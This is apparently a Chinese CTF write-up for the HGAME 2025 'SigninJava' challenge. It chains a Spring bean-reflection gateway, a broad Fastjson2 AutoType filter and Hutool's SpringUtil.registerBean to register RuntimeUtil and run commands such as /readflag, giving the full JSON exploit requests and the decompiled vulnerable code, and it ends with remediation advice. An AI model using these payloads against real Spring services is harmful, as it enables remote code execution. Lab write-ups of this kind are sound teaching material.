# HGAME 2025 Level 60 SigninJava

## 题目简述

题目只开放 `/api/gateway`：客户端提交 Spring Bean 名、方法名和参数，服务端通过反射调用对应方法。网关试图禁止访问名称中带 `flag` 的 Bean，却允许调用 Hutool 的 `SpringUtil.registerBean`，并在参数转换时允许 `cn.hutool.*` 的 Fastjson2 AutoType。由此可以先把具备系统命令执行能力的 `RuntimeUtil` 注册为新 Bean，再经同一网关调用它读取 flag。

原 PDF 只给出了注册 Bean 和执行 `whoami` 的两组请求。为补足源码约束和最终读取步骤，本文同时参考了[参赛者对题目 JAR 的反编译记录](https://www.n0o0b.com/archives/hgame2025-week2)，并用 Hutool 官方 API 文档核对了 [`SpringUtil.registerBean`](https://plus.hutool.cn/apidocs/cn/hutool/extra/spring/SpringUtil.html) 与 [`RuntimeUtil.execForStr`](https://plus.hutool.cn/apidocs/cn/hutool/core/util/RuntimeUtil.html) 的真实语义。

## 解题过程

### 1. 审计统一调用网关

网关接收三个字段：

```json
{
  "beanName": "目标 Bean 名",
  "methodName": "目标方法名",
  "params": {
    "arg0": "第一个参数"
  }
}
```

反编译得到的核心控制逻辑可整理为：

```java
@Controller
@RequestMapping("/api")
public class APIGatewayController {
    @RequestMapping(value = "/gateway", method = RequestMethod.POST)
    @ResponseBody
    public BaseResponse doPost(HttpServletRequest request) throws Exception {
        try {
            String body = IOUtils.toString(request.getReader());
            Map<String, Object> map = JSON.parseObject(body, Map.class);
            String beanName = (String) map.get("beanName");
            String methodName = (String) map.get("methodName");
            Map<String, Object> params =
                (Map<String, Object>) map.get("params");

            if (StrUtil.containsAnyIgnoreCase(beanName, "flag")) {
                return new BaseResponse(
                    403, "flagTestService offline", null
                );
            }

            Object result = InvokeUtils.invokeBeanMethod(
                beanName, methodName, params
            );
            return new BaseResponse(200, null, result);
        } catch (Exception e) {
            Throwable cause = Objects.requireNonNullElse(e.getCause(), e);
            return new BaseResponse(500, cause.getMessage(), null);
        }
    }
}
```

直接指定 `flagTestService` 会触发不区分大小写的 `flag` 检查，因此不能直接调用它的读 flag 方法。但限制只看最外层 `beanName`，没有为“可调用哪些 Bean、哪些方法”建立真正的允许列表。

### 2. 找到可动态注册的 Bean

Hutool 的 `cn.hutool.extra.spring.SpringUtil` 是 Spring 容器工具类，其中：

```java
public static <T> void registerBean(String beanName, T bean)
```

可以在运行时把任意已构造对象注册进当前 BeanFactory。题目参数转换还建立了一个 Fastjson2 AutoType 过滤器，大意如下：

```java
private static final Filter autoTypeFilter = JSONReader.autoTypeFilter(
    Arrays.stream(
        SpringContextHolder.getApplicationContext()
            .getBeanDefinitionNames()
    )
    .map(name -> {
        int first = name.indexOf('.');
        int second = name.indexOf('.', first + 1);
        return second != -1 ? name.substring(0, second + 1) : null;
    })
    .filter(Objects::nonNull)
    .toArray(String[]::new)
);
```

它原本想把可反序列化类型限制在已加载 Bean 的包前缀中，但 Hutool 相关 Bean 让 `cn.hutool.` 进入了允许范围。Fastjson2 的 `@type` 因而可以把参数实例化为：

```text
cn.hutool.core.util.RuntimeUtil
```

Fastjson2 官方说明也强调，AutoType 默认关闭；一旦业务通过 `JSONReader.autoTypeFilter` 开放类型，就应把前缀收得尽可能小。这里按宽包前缀开放，恰好把危险工具类一并纳入。

### 3. 注册 `RuntimeUtil`

第一次请求调用 `SpringUtil.registerBean`，把 `RuntimeUtil` 实例注册成名为 `execCmd` 的 Bean：

```http
POST /api/gateway HTTP/1.1
Host: <challenge-host>
Content-Type: application/json

{
  "beanName": "cn.hutool.extra.spring.SpringUtil",
  "methodName": "registerBean",
  "params": {
    "arg0": "execCmd",
    "arg1": {
      "@type": "cn.hutool.core.util.RuntimeUtil"
    }
  }
}
```

此时 `execCmd` 不包含被过滤的 `flag` 字样，却指向一个提供 `exec`、`execForStr` 和 `execForLines` 的命令执行工具类。

### 4. 验证命令执行

原 PDF 使用带字符集参数的 `execForStr(Charset, String...)` 重载验证 `whoami`：

```http
POST /api/gateway HTTP/1.1
Host: <challenge-host>
Content-Type: application/json

{
  "beanName": "execCmd",
  "methodName": "execForStr",
  "params": {
    "arg0": "utf-8",
    "arg1": ["whoami"]
  }
}
```

若参数转换和方法匹配正常，响应的 `data` 字段会带回命令标准输出。

### 5. 读取 flag

公开复盘中确认题目容器提供了 `/readflag`。因此可沿用 `execForStr`：

```json
{
  "beanName": "execCmd",
  "methodName": "execForStr",
  "params": {
    "arg0": "utf-8",
    "arg1": ["/readflag"]
  }
}
```

也可以调用参数更简单的 `execForLines(String...)`：

```json
{
  "beanName": "execCmd",
  "methodName": "execForLines",
  "params": {
    "arg0": ["/readflag"]
  }
}
```

命令输出即为 flag。现有 PDF 和可核对的公开文字均未保留具体 flag 字符串，因此不在本文中猜测。

## 方法总结

本题不是单独一个“Fastjson gadget”，而是三项能力组合造成的调用链：过度通用的 Bean 反射网关、按宽包前缀开放的 AutoType，以及 Hutool 提供的动态 Bean 注册与命令执行工具。利用顺序为：

```text
@type 构造 RuntimeUtil
        ↓
SpringUtil.registerBean("execCmd", ...)
        ↓
网关调用 execCmd.execForStr / execForLines
        ↓
/readflag
```

修复时应删除面向外部的任意 Bean/方法反射入口，改成业务动作到固定处理函数的显式映射；同时关闭 AutoType，或仅允许确有业务需要的具体数据类。仅过滤 Bean 名中的 `flag` 无法限制等价能力，也挡不住攻击者先注册一个新名字再间接调用危险方法。
